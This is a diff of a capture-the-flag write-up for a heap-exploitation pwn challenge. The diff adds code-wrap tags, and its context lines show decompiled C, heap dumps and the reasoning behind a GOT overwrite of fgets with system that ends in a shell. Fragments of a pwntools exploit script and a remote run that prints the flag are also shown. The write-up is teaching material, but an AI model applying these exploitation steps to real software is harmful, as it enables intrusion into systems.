@@ -30,6 +30,7 @@ layout:
 
 ## Source
 
+{% code overflow="wrap" %}
 ```c
 void main(void)
 {
@@ -43,9 +44,11 @@ void main(void)
   } while( true );
 }
 ```
+{% endcode %}
 
 #### View elements in the linked list
 
+{% code overflow="wrap" %}
 ```c
 void view_list(void)
 {
@@ -66,9 +69,11 @@ void view_list(void)
   return;
 }
 ```
+{% endcode %}
 
 #### Write elements to the list
 
+{% code overflow="wrap" %}
 ```c
 ssize_t write(int __fd,void *__buf,size_t __n)
 {
@@ -137,9 +142,11 @@ ssize_t write(int __fd,void *__buf,size_t __n)
   return sVar2;
 }
 ```
+{% endcode %}
 
 #### Write data to an element in the list
 
+{% code overflow="wrap" %}
 ```c
 void write_data(char *param_1)
 {
@@ -154,9 +161,11 @@ void write_data(char *param_1)
   return;
 }
 ```
+{% endcode %}
 
 #### View time
 
+{% code overflow="wrap" %}
 ```c
 void view_time(void)
 {
@@ -164,6 +173,7 @@ void view_time(void)
   return;
 }
 ```
+{% endcode %}
 
 ## Solution
 
@@ -177,6 +187,7 @@ This challenge took me a while to solve, and I had to rethink my approach, so ra
 
 We'll visualise the heap layout. First, Create a head node (pos=0) and check `heap`.
 
+{% code overflow="wrap" %}
 ```sh
 Allocated chunk | PREV_INUSE
 Addr: 0x4056a0
@@ -186,9 +197,11 @@ Top chunk | PREV_INUSE
 Addr: 0x4056f0
 Size: 0x20911
 ```
+{% endcode %}
 
 Confirm with `vis_heap_chunks` (or just `vis`).
 
+{% code overflow="wrap" %}
 ```sh
 0x4056a0	0x0000000000000000	0x0000000000000051	........Q.......
 0x4056b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
@@ -197,6 +210,7 @@ Confirm with `vis_heap_chunks` (or just `vis`).
 0x4056e0	0x0000000000000000	0x0000000000000000	................
 0x4056f0	0x0000000000000000	0x0000000000020911	................	 <-- Top chunk
 ```
+{% endcode %}
 
 Although `malloc(0x48)` is called, an 80 byte (`0x50`) chunk is returned (`0x4056a0`). We see `0x51` because the `0x1` at the LSB indicates the previous chunk is **not** free. Our input `"CHUNK_0"` immediately follows in the chunk data.
 
@@ -204,6 +218,7 @@ Note the `Top chunk` at (`0x4056f0`) has a size of `0x20911`. We'll see this dec
 
 We create a second node (pos=1) and check `heap` and `vis_heap_chunks` again. Note the decrease in the size of the `Top chunk`.
 
+{% code overflow="wrap" %}
 ```sh
 Allocated chunk | PREV_INUSE
 Addr: 0x4056a0
@@ -217,7 +232,9 @@ Top chunk | PREV_INUSE
 Addr: 0x405740
 Size: 0x208c1
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```sh
 0x4056a0	0x0000000000000000	0x0000000000000051	........Q.......
 0x4056b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
@@ -231,27 +248,33 @@ Size: 0x208c1
 0x405730	0x0000000000000000	0x0000000000000000	................
 0x405740	0x0000000000000000	0x00000000000208c1	................	 <-- Top chunk
 ```
+{% endcode %}
 
 Our second chunk is at `0x4056f0`, and we can see our input `"CHUNK_1"`.
 
 Note that our second chunk at `0x4056f0` holds the address of our first chunk's data (`0x405700`); this is the address written by the custom linked list implementation, i.e. it's not a feature of the heap or malloc itself. The line of code responsible for setting this address:
 
+{% code overflow="wrap" %}
 ```c
 /* set old tail to point to new tail */
 *(void **)((long)tail + 0x40) = element;
 ```
+{% endcode %}
 
 So whenever we added a new tail node, the last 8 bytes of the previous tail node were updated to point to the data section of the new node.
 
 Our new tail node points to `NULL`, evidenced by the fact `0x405740` is set to `0x0` and resulting from the following line of code:
 
+{% code overflow="wrap" %}
 ```c
 /* set node pointer to null */
 *(undefined8 *)((long)element + 0x40) = 0;
 ```
+{% endcode %}
 
 We create a third element (pos=2) and check `heap` and `vis_heap_chunks` again.
 
+{% code overflow="wrap" %}
 ```sh
 Allocated chunk | PREV_INUSE
 Addr: 0x4056a0
@@ -269,7 +292,9 @@ Top chunk | PREV_INUSE
 Addr: 0x405790
 Size: 0x20871
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```sh
 0x4056a0	0x0000000000000000	0x0000000000000051	........Q.......
 0x4056b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
@@ -288,6 +313,7 @@ Size: 0x20871
 0x405780	0x0000000000000000	0x0000000000000000	................
 0x405790	0x0000000000000000	0x0000000000020871	........q.......	 <-- Top chunk
 ```
+{% endcode %}
 
 Our third chunk is at `0x405740`, and we can see our input `"CHUNK_2"`.
 
@@ -299,6 +325,7 @@ In `Links 1`, we overflowed one of the elements in the list, overwriting the poi
 
 We can't do that with the `"date"` string (`0x4020c7`) because it's in `.rodata`, therefore read-only. Instead, we can try to overwrite an entry in the global offset table (GOT). We can use `checksec` to ensure that `Full RELRO` is not enabled, as it would prevent us from writing to the GOT.
 
+{% code overflow="wrap" %}
 ```sh
 Arch:     amd64-64-little
 RELRO:    Partial RELRO
@@ -306,6 +333,7 @@ Stack:    No canary found
 NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
+{% endcode %}
 
 But which Lib-C function call should we replace with `system()`? We need to find one that will:
 
@@ -322,15 +350,19 @@ It would be even better if we could find a function that takes in a char\* from 
 
 It just so happens that we have precisely that. The `write_data` function writes our input to an element of the list. It takes our input as a char pointer.
 
+{% code overflow="wrap" %}
 ```c
 void write_data(char *param_1)
 ```
+{% endcode %}
 
 Inside the function, `*param_1` (our user input) is supplied as the first parameter to `fgets`.
 
+{% code overflow="wrap" %}
 ```c
 fgets(param_1,100,stdin);
 ```
+{% endcode %}
 
 Therefore, our input will be popped into the RDI. We should get a shell if we can replace the `fgets` function with `system` and supply our "/bin/sh" string.
 
@@ -348,6 +380,7 @@ A couple of things to mention:
 
 We'll create a PwnTools script, setting a breakpoint at `write_data`.
 
+{% code overflow="wrap" %}
 ```py
 from pwn import *
 
@@ -416,9 +449,11 @@ io.sendlineafter(b'>>>', b'1')
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
 
 Note when we overwrite the link in the list, we submit `0x51` afterwards to keep our heap intact, e.g. if we don't specify the next chunk's size, the heap won't know where it ends, and the next chunk begins. See the following output when we **don't** supply `0x51`.
 
+{% code overflow="wrap" %}
 ```sh
 0xd4c240	0x0000000000000000	0x0000000000000000	................
 0xd4c250	0x0000000000000000	0x0000000000000000	................
@@ -437,9 +472,11 @@ Note when we overwrite the link in the list, we submit `0x51` afterwards to keep
 0xd4c320	0x0000000000000000	0x0000000000000000	................
 0xd4c330	0x0000000000000000	0x0000000000000000	................
 ```
+{% endcode %}
 
 But when **do** we supply the `0x51`, the top chunk is visible.
 
+{% code overflow="wrap" %}
 ```sh
 0x224e2a0	0x0000000000000000	0x0000000000000051	........Q.......
 0x224e2b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
@@ -458,21 +495,27 @@ But when **do** we supply the `0x51`, the top chunk is visible.
 0x224e380	0x0000000000000000	0x0000000000000000	................
 0x224e390	0x0000000000000000	0x000000000001fc71	........q....... <-- Top chunk
 ```
+{% endcode %}
 
 If we check the `got` command, we'll see that `fgets` has been overwritten with `system`.
 
+{% code overflow="wrap" %}
 ```sh
 [0x404040] fgets@GLIBC_2.2.5 -> 0x404030 (system@got[plt]) —▸ 0x7fecc1f7fe50 (system) ◂— test   rdi, rdi
 ```
+{% endcode %}
 
 Notice the `0x7fecc1f7fe50` address; this is the address of `system` in Lib-C. Now compare that to when we **don't** call `view_time` before overwriting the GOT entry. This will be important later.
 
+{% code overflow="wrap" %}
 ```sh
 [0x404040] fgets@GLIBC_2.2.5 -> 0x404030 (system@got[plt]) —▸ 0x401066 (system@plt+6) ◂— push   3
 ```
+{% endcode %}
 
 So what happens when we run through the whole exploit?
 
+{% code overflow="wrap" %}
 ```sh
 Program received signal SIGSEGV, Segmentation fault.
 0x0000000000404030 in system@got[plt] ()
@@ -498,6 +541,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ───────────────────────────────────[ DISASM ]───────────────────────────────────
  ► 0x404030 <system@got[plt]>    push   rax
 ```
+{% endcode %}
 
 The RIP contains `system` and the RDI contains the address of "/bin//sh", yet we got a segfault! The reason is due to stack alignment. Notice that RSP holds `0x7ffc1c97c518`; the trailing `8` indicates that the stack is not 16-byte aligned.
 
@@ -511,18 +555,22 @@ Stack alignment issues come up in pwn challenges **a lot**, and the solution typ
 
 However, in this case, we don't have control of the stack. Instead, we can try to jump to `system+1`, i.e. skip the first `push rax` instruction, which is causing a segfault.
 
+{% code overflow="wrap" %}
 ```sh
  ► 0x404030 <system@got[plt]>    push   rax
 ```
+{% endcode %}
 
 This raises a new problem. Namely, the `got.system` address is `0x404030`, so if we enter `system+1` it will be `0x404031`. Let's review the GOT.
 
+{% code overflow="wrap" %}
 ```c
                   PTR_system_00404030                   XREF[1]:  system:00401060
  00404030 18 50       addr     <EXTERNAL>::system                    ; = ??
                   PTR_printf_00404038                   XREF[1]:  printf:00401070
  00404038 20 50       addr     <EXTERNAL>::printf                    ; = ??
 ```
+{% endcode %}
 
 `got.printf` begins at `0x404038`, so if we write 8 bytes to `0x404031`, we'll overwrite the first byte of `got.printf` **and** miss the first byte of `got.system`.
 
@@ -532,6 +580,7 @@ We can leak the Lib-C address the same way we leaked the `flag` in the last chal
 
 We can proceed with the remainder of the exploit, overwriting `got.fgets` with `leaked_system+1` instead of `got.system`. We get a shell and run `cat flag.txt` 🙂
 
+{% code overflow="wrap" %}
 ```sh
 python exploit.py REMOTE puzzler7.imaginaryctf.org 2007
 [+] Opening connection to puzzler7.imaginaryctf.org on port 2007: Done
@@ -542,9 +591,11 @@ python exploit.py REMOTE puzzler7.imaginaryctf.org 2007
 >>> $ cat flag.txt
 ictf{who_knew_the_current_date_could_be_so_dangerous?}$
 ```
+{% endcode %}
 
 **edit:** `system+1` was not required. When we leak the Lib-C address, we can call it directly from the base. If we setup a breakpoint at `write_data` and step through until the `fgets` (`system`) call:
 
+{% code overflow="wrap" %}
 ```sh
  RSP  0x7fff526190b0 ◂— 0x0
 *RIP  0x401241 (write_data+60) ◂— call   0x401080
@@ -560,6 +611,7 @@ ictf{who_knew_the_current_date_could_be_so_dangerous?}$
         n: 0x64
         stream: 0x7f174e9c6980 (_IO_2_1_stdin_) ◂— 0xfbad2088
 ```
+{% endcode %}
 
 Notice that the RSP (`0x7fff526190b0`) no longer ends with an `8`, like it did when we were getting a segfault.
 
@@ -569,6 +621,7 @@ Notice that the RSP (`0x7fff526190b0`) no longer ends with an `8`, like it did w
 
 Here's a snippet of the `plt.system` section of the binary. We should of used `0x401060` in this instance.
 
+{% code overflow="wrap" %}
 ```c
 thunk int system(char * __command)
       Thunked-Function: <EXTERNAL>::system
@@ -579,9 +632,11 @@ char *        RDI:8      __command
 00401066 68 03       PUSH     0x3
 0040106b e9 b0       JMP      FUN_00401020
 ```
+{% endcode %}
 
 ## Solve Script
 
+{% code overflow="wrap" %}
 ```py
 from pwn import *
 
@@ -655,3 +710,4 @@ io.sendlineafter(b'>>>', b'1')
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
